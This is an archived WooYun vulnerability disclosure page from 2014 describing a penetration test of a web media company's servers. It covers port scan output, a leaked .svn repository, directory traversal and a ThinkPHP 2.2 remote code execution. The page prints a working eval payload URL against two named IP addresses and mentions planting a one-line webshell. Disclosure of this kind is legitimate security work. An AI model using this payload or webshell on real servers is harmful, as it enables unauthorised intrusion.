@@ -1,0 +1,251 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[世博网媒渗透测试#1]服务器某处远程命令执行间接利用可沦陷多台WEB服务器  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[世博网媒渗透测试#1]服务器某处远程命令执行间接利用可沦陷多台WEB服务器  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/开心超人">开心超人</a> 
+</li><li>提交时间：		2014-01-21 13:04</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-21：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2014-03-07：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">RT</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">TOP1:信息搜集<br />
+<br />
+</p><pre><code>C:\Documents and Settings\Administrator&gt;nslookup sibore.com<br />
+Server:  localhost<br />
+Address:  192.168.1.1<br />
+<br />
+Non-authoritative answer:<br />
+Name:    sibore.com<br />
+Address:  58.49.59.87</code></pre><p class='detail'><br />
+<br />
+域名解析到58.49.59.87<br />
+<br />
+简单的扫描了一下开放的端口，结果如下：<br />
+<br />
+</p><pre><code>Scanning 58.49.59.87 [4 ports]<br />
+<br />
+Completed Ping Scan at 11:32, 0.36s elapsed (1 total hosts)<br />
+<br />
+Initiating Parallel DNS resolution of 1 host. at 11:32<br />
+<br />
+Completed Parallel DNS resolution of 1 host. at 11:32, 0.16s elapsed<br />
+<br />
+Initiating SYN Stealth Scan at 11:32<br />
+<br />
+Scanning 58.49.59.87 [1000 ports]<br />
+<br />
+Discovered open port 25/tcp on 58.49.59.87<br />
+<br />
+Discovered open port 443/tcp on 58.49.59.87<br />
+<br />
+Discovered open port 110/tcp on 58.49.59.87<br />
+<br />
+Discovered open port 554/tcp on 58.49.59.87<br />
+<br />
+Discovered open port 80/tcp on 58.49.59.87<br />
+<br />
+Discovered open port 8080/tcp on 58.49.59.87<br />
+<br />
+Discovered open port 8009/tcp on 58.49.59.87<br />
+<br />
+Discovered open port 8011/tcp on 58.49.59.87<br />
+<br />
+Discovered open port 2105/tcp on 58.49.59.87<br />
+<br />
+Discovered open port 81/tcp on 58.49.59.87<br />
+<br />
+Discovered open port 1755/tcp on 58.49.59.87</code></pre><p class='detail'><br />
+<br />
+分析了一下，我把目标放在了81端口。拿扫描器扫描发现多处问题<br />
+<br />
+TOP2：源代码泄露<br />
+<br />
+我访问了如下URL：http://sibore.net.cn:81/.svn/<br />
+<br />
+源代码泄露http://sibore.net.cn:81/.svn/pristine/，其目录下包含了大量网站的源代码服务器配置出现了问题。</p><p class="detail"><a href="../images/211144133d1c333ee735f75de30c9e5549c49718.png" target="_blank"><img src="../images/211144133d1c333ee735f75de30c9e5549c49718.png" alt="QQ截图20140121113736.png" width="600"/></a></p><p class="detail">看到下面有个wc.db，于是我下载了下来</p><p class="detail"><a href="../images/21113828f2f6118948e347c701695f9d6a60a7ac.png" target="_blank"><img src="../images/21113828f2f6118948e347c701695f9d6a60a7ac.png" alt="QQ截图20140121113736.png" width="600"/></a></p><p class="detail">在其中的数据表NODES中我们可以看到几乎整个网站的架构。<br />
+<br />
+</p><p class="detail"><a href="../images/21115847f4dce9f2ab1de3ab7515c47651314d87.png" target="_blank"><img src="../images/21115847f4dce9f2ab1de3ab7515c47651314d87.png" alt="C36DE69CE0BEC6E984DF9FA945A2C851.png" width="600"/></a></p><p class="detail"><br />
+<br />
+TOP3.1：目录遍历<br />
+<br />
+从数据表中我们看到了网站的全貌，然而危害更为严重的是网站存在很严重的目录遍历漏洞呢，由于可遍历数量太多，在此就不一一列出,上图：</p><p class="detail"><a href="../images/211204310ac214daf1eae9dd590ecccdb8f9a2e9.png" target="_blank"><img src="../images/211204310ac214daf1eae9dd590ecccdb8f9a2e9.png" alt="C36DE69CE0BEC6E984DF9FA945A2C851.png" width="600"/></a></p><p class="detail"><br />
+<br />
+TOP4：THINKPHP框架远程命令执行GETSHELL<br />
+<br />
+我们可以看出，81端口下的网站采用THINKPHP框架搭建，且版本过低为2.2，存在高危漏洞!<br />
+<br />
+phpinfo():</p><p class="detail"><a href="../images/21120943a0b14ceb230c354a427130b6f77bd773.png" target="_blank"><img src="../images/21120943a0b14ceb230c354a427130b6f77bd773.png" alt="C36DE69CE0BEC6E984DF9FA945A2C851.png" width="600"/></a></p><p class="detail"><br />
+<br />
+直接插入一句话木马连接之:<br />
+<br />
+</p><p class="detail"><a href="../images/211213352416c5e327c2954d3ac7311042df4ca6.png" target="_blank"><img src="../images/211213352416c5e327c2954d3ac7311042df4ca6.png" alt="C36DE69CE0BEC6E984DF9FA945A2C851.png" width="600"/></a></p><p class="detail"><br />
+<br />
+TOP4:多台服务器远程命令执行<br />
+<br />
+在随后的渗透测试过程中，我发现了贵公司有好几台服务器同时存在上述漏洞<br />
+<br />
+</p><pre><code>http://219.140.172.152/nmcHDtouch/index.php/module/action/param1/$%7B@eval%28$_POST[c]%29%7D</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/21121846da2e6578205f80d0cfeaba85dab24712.png" target="_blank"><img src="../images/21121846da2e6578205f80d0cfeaba85dab24712.png" alt="C36DE69CE0BEC6E984DF9FA945A2C851.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><pre><code>http://121.61.118.178/nmcHDtouch/index.php/module/action/param1/$%7B@eval%28$_POST[c]%29%7D</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/2112235205f99578f0e08ecd3eb9aa2ad0e159e6.png" target="_blank"><img src="../images/2112235205f99578f0e08ecd3eb9aa2ad0e159e6.png" alt="C36DE69CE0BEC6E984DF9FA945A2C851.png" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/211144133d1c333ee735f75de30c9e5549c49718.png" target="_blank"><img src="../images/211144133d1c333ee735f75de30c9e5549c49718.png" alt="QQ截图20140121113736.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/21113828f2f6118948e347c701695f9d6a60a7ac.png" target="_blank"><img src="../images/21113828f2f6118948e347c701695f9d6a60a7ac.png" alt="QQ截图20140121113736.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/21115847f4dce9f2ab1de3ab7515c47651314d87.png" target="_blank"><img src="../images/21115847f4dce9f2ab1de3ab7515c47651314d87.png" alt="C36DE69CE0BEC6E984DF9FA945A2C851.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/211204310ac214daf1eae9dd590ecccdb8f9a2e9.png" target="_blank"><img src="../images/211204310ac214daf1eae9dd590ecccdb8f9a2e9.png" alt="C36DE69CE0BEC6E984DF9FA945A2C851.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/21120943a0b14ceb230c354a427130b6f77bd773.png" target="_blank"><img src="../images/21120943a0b14ceb230c354a427130b6f77bd773.png" alt="C36DE69CE0BEC6E984DF9FA945A2C851.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/211213352416c5e327c2954d3ac7311042df4ca6.png" target="_blank"><img src="../images/211213352416c5e327c2954d3ac7311042df4ca6.png" alt="C36DE69CE0BEC6E984DF9FA945A2C851.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/21121846da2e6578205f80d0cfeaba85dab24712.png" target="_blank"><img src="../images/21121846da2e6578205f80d0cfeaba85dab24712.png" alt="C36DE69CE0BEC6E984DF9FA945A2C851.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/2112235205f99578f0e08ecd3eb9aa2ad0e159e6.png" target="_blank"><img src="../images/2112235205f99578f0e08ecd3eb9aa2ad0e159e6.png" alt="C36DE69CE0BEC6E984DF9FA945A2C851.png" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1.THINKPHP版本过低需升级。<br />
+<br />
+2.遍历漏洞需要修补。<br />
+<br />
+备注：上述WEB服务器可能有缺漏，管理员需要自己去修补。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/开心超人" title="开心超人">开心超人</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049435" title="[世博网媒渗透测试#1]服务器某处远程命令执行间接利用可沦陷多台WEB服务器">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49435";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
